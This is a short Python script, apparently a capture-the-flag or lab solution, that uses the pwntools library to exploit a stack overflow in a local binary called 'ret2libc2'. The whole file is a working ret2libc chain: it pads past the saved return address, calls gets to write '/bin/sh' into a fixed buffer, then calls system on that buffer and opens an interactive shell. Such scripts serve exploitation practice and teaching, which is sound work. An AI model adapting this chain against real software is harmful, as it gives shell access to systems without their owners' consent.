from pwn import *

gets_plt_addr = 0x08048460
system_plt_addr = 0x08048490
buf2_addr = 0x0804A080
offset = 0xFFDF6348-0xFFDF62DC+4

payload = ( offset * b'A'\
			+ p32(gets_plt_addr) + p32(system_plt_addr)\
			+ p32(buf2_addr) + p32(buf2_addr))
sh = process("./ret2libc2")
sh.sendline(payload)
sh.sendline('/bin/sh')
sh.interactive()
